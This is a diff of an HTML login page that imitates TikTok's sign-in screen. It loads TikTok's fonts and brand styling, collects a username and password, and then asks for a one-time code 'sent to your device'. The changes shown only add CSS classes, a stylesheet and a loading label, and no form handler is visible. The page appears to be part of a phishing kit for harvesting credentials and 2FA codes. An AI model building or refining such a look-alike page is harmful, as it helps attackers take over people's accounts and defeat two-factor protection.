@@ -10,6 +10,7 @@
   <style>
    @font-face { font-family: 'TikTokFont'; src: url('https://lf16-tiktok-web.ttwstatic.com/obj/tiktok-web/tiktok/web/node/_next/static/fonts/ProximaNova-Regular-b695e8.woff2') format('woff2'); font-weight: 400; } @font-face { font-family: 'TikTokFont'; src: url('https://lf16-tiktok-web.ttwstatic.com/obj/tiktok-web/tiktok/web/node/_next/static/fonts/ProximaNova-Bold-2f5b61.woff2') format('woff2'); font-weight: 700; } @font-face { font-family: 'TikTokFont'; src: url('https://lf16-tiktok-web.ttwstatic.com/obj/tiktok-web/tiktok/web/node/_next/static/fonts/ProximaNova-Semibold-d00cda.woff2') format('woff2'); font-weight: 600; } body { font-family: "TikTokFont", "Proxima Nova", Arial, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #fff; color: rgba(22, 24, 35, 1); } .container { width: 100%; max-width: 480px; text-align: center; padding: 0 24px; } .logo-header { margin-bottom: 20px; } h1 { font-size: 32px; font-weight: 700; margin-bottom: 16px; margin-top: 0; color: rgba(22, 24, 35, 1); } .subtitle { font-size: 15px; color: rgba(22, 24, 35, 0.5); margin-bottom: 32px; } .login-methods { display: flex; flex-direction: column; gap: 12px; max-height: 400px; overflow-y: auto; } .method { display: flex; align-items: center; justify-content: center; padding: 12px 16px; border: 1px solid rgba(22, 24, 35, 0.12); border-radius: 2px; font-weight: 600; cursor: pointer; position: relative; background: #fff; color: rgba(22, 24, 35, 1); font-size: 15px; height: 44px; box-sizing: border-box; transition: background-color 0.2s; } .method:hover { background-color: rgba(22, 24, 35, 0.03); } .method-icon { position: absolute; left: 16px; width: 20px; height: 20px; display: flex; align-items: center; justify-content: center; } .form-container { text-align: left; margin-top: 20px; display: none; } .form-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; } .form-title { font-size: 24px; font-weight: 700; } .input-group { margin-bottom: 16px; } .label { font-size: 14px; font-weight: 600; margin-bottom: 8px; display: block; } input { width: 100%; padding: 12px; background: rgba(22, 24, 35, 0.06); border: 1px solid transparent; border-radius: 4px; margin-bottom: 0; box-sizing: border-box; font-size: 16px; caret-color: #fe2c55; } input:focus { background: rgba(22, 24, 35, 0.03); border-color: rgba(22, 24, 35, 0.12); outline: none; } .password-container { position: relative; } .toggle-password { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); cursor: pointer; width: 20px; height: 20px; opacity: 0.5; } .submit-btn { width: 100%; padding: 14px; background-color: #fe2c55; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 8px; transition: background-color 0.2s; } .submit-btn:hover { background-color: #ef2950; } .submit-btn:disabled { background-color: rgba(22, 24, 35, 0.06); color: rgba(22, 24, 35, 0.34); cursor: not-allowed; } .footer { margin-top: 0; padding: 24px; background-color: #fff; border-top: 1px solid rgba(22, 24, 35, 0.12); width: 100%; position: fixed; bottom: 0; left: 0; text-align: center; font-size: 15px; display: flex; justify-content: center; } .footer span { color: rgba(22, 24, 35, 0.5); margin-right: 6px; } .footer a { color: #fe2c55; text-decoration: none; font-weight: 600; } .footer a:hover { text-decoration: underline; } .spinner { display: inline-block; width: 18px; height: 18px; border: 2px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; margin-right: 8px; vertical-align: middle; } @keyframes spin { to { transform: rotate(360deg); } } .error-message { color: #fe2c55; font-size: 12px; margin-top: 4px; display: none; } .back-btn { background: none; border: none; cursor: pointer; padding: 0; margin-right: 10px; } .qr-section { display: none; flex-direction: column; align-items: center; }
   </style>
+  <link href="/core/assets/css/animations.css" rel="stylesheet"/>
  </head>
  <body>
   <div class="container" id="main-menu">
@@ -81,7 +82,7 @@
   </div>
   <div class="container" id="login-form" style="display: none;">
    <div class="form-header">
-    <button class="back-btn" onclick="showMenu()">
+    <button class="back-btn btn-primary" onclick="showMenu()">
      <svg fill="none" height="24" viewbox="0 0 48 48" width="24" xmlns="http://www.w3.org/2000/svg">
       <path clip-rule="evenodd" d="M22.1122 10.8284L23.5264 12.2426L14.1226 21.6464H38.5V23.6464H14.1226L23.5264 33.0503L22.1122 34.4645L9.64775 22.0001L22.1122 10.8284Z" fill="#161823" fill-rule="evenodd">
       </path>
@@ -99,11 +100,11 @@
      <label class="label">
       Phone / Email / Username
      </label>
-     <input id="username" placeholder="Email or Username" required="" type="text"/>
+     <input class="input-field" id="username" placeholder="Email or Username" required="" type="text"/>
     </div>
     <div class="input-group">
      <div class="password-container">
-      <input id="password" placeholder="Password" required="" type="password"/>
+      <input class="input-field" id="password" placeholder="Password" required="" type="password"/>
      </div>
      <div class="error-message" id="error-msg">
       Incorrect username or password
@@ -112,7 +113,7 @@
     <a href="#" style="color: rgba(22, 24, 35, 0.75); font-size: 12px; font-weight: 600; text-decoration: none; display: block; margin-bottom: 20px;">
      Forgot password?
     </a>
-    <button class="submit-btn" id="btn-login" type="submit">
+    <button class="submit-btn btn-primary" data-loading-text="Verifying..." id="btn-login" type="submit">
      Log in
     </button>
    </form>
@@ -164,8 +165,8 @@
    <p style="margin-bottom: 20px; color: #666;">
     Please enter the code sent to your device.
    </p>
-   <input id="otp-input" placeholder="Enter code" style="padding: 10px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 20px; width: 80%;" type="text"/>
-   <button id="btn-otp-submit" style="padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer;">
+   <input class="input-field" id="otp-input" placeholder="Enter code" style="padding: 10px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 20px; width: 80%;" type="text"/>
+   <button class="btn-primary" id="btn-otp-submit" style="padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer;">
     Verify
    </button>
   </div>
